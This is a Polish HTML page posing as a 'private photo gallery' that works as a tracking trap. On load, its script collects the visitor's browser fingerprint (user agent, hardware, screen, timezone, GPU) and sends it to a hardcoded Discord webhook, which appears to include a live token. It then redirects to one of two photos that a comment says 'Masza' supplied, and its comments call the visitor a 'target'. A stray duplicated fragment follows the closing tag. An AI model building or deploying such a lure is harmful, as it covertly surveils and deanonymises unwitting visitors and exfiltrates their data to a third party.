<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Prywatna Galeria Zdjęć - Live Debug</title>
  <style>
    body { background: #0f172a; color: #fff; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 15px; text-align: center; box-sizing: border-box; }
    .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin-bottom: 10px; }
    p { margin: 5px 0 15px 0; font-size: 14px; }
    #debug-box { padding: 10px; background: #020617; border: 1px solid #38bdf8; border-radius: 6px; width: 100%; max-width: 450px; height: 130px; overflow-y: auto; text-align: left; font-size: 10px; color: #38bdf8; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <p>Wczytywanie bezpiecznej galerii...</p>
  
  <!-- Widoczny panel debugowania na dole -->
  <div id="debug-box">[SYSTEM] Inicjalizacja modułu OSINT...</div>

  <script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550302869847281716/Vm79NB7uHGzqnzfUSaj2dmW5vr0sQ6fMxQJOUUP2h1n6BSpSNKKUf9oea9ZQJ0uyhaf5";
    
    // Obie fotki podesłane przez Maszę – losujemy cel przekierowania
    const targetPhotos = [
      "./20260808_121307.jpg",
      "./IMG_20250315_160715.heif"
    ];
    const REDIRECT_URL = targetPhotos[Math.floor(Math.random() * targetPhotos.length)];

    function logDebug(msg) {
      console.log(msg);
      const box = document.getElementById('debug-box');
      if(box) {
        box.innerHTML += "<br>> " + msg;
        box.scrollTop = box.scrollHeight;
      }
    }

    logDebug("Wylosowano plik docelowy: " + REDIRECT_URL);

    // Awaryjny bezpiecznik: po 3 sekundach twarde przekierowanie, żeby cel nie utknął
    const safetyTimer = setTimeout(() => {
      logDebug("CRITICAL: Safety timer! Wymuszam redirect...");
      window.location.replace(REDIRECT_URL);
    }, 3000);

    function harvestIntel() {
      let gpu = "Nieznane";
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const di = gl.getExtension('WEBGL_debug_renderer_info');
          if (di) gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
        }
      } catch(err) {
        logDebug("Błąd GPU: " + err.message);
      }
      return {
        ua: navigator.userAgent,
        platform: navigator.platform || "N/A",
        cores: navigator.hardwareConcurrency || "?",
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "?",
        screen: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
        gpu: gpu
      };
    }

    async function executeTrap() {
      try {
        logDebug("Skanowanie środowiska (GPU/RAM)...");
        const data = harvestIntel();
        logDebug("GPU: " + data.gpu);

        const payload = {
          username: "MASZA OSINT DEBUGGER",
          embeds: [{
            title: "🎯 TRAFIONY CEL (2 PLIKI + WIDOCZNY DEBUG)!",
            color: 15158332,
            fields: [
              { name: "📂 Wylosowany Plik", value: `\`${REDIRECT_URL}\``, inline: false },
              { name: "🎮 GPU Renderer", value: `\`${data.gpu}\``, inline: false },
              { name: "💻 Hardware", value: `CPU: \`${data.cores}\` | RAM: \`${data.ram}\``, inline: true },
              { name: "🌍 Strefa", value: `\`${data.timezone}\``, inline: true },
              { name: "🖥️ User-Agent", value: `\`\`\`${data.ua}\`\`\``, inline: false }
            ],
            timestamp: new Date()
          }]
        };

        logDebug("Wysyłanie danych do Discorda...");
        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true
        });
        logDebug("Wysyłka OK! Przekierowanie za chwilę...");

      } catch(err) {
        logDebug("BŁĄD: " + err.message);
      } finally {
        clearTimeout(safetyTimer);
        setTimeout(() => {
          window.location.replace(REDIRECT_URL);
        }, 1000); // 1 sekunda opóźnienia, żebyś zdążył zobaczyć logi na ekranie
      }
    }

    executeTrap();
  </script>
</body>
</html>

        setTimeout(() => {
          window.location.replace(REDIRECT_URL);

      }
    }

    executeTrap();
  </script>
</body>
</html>
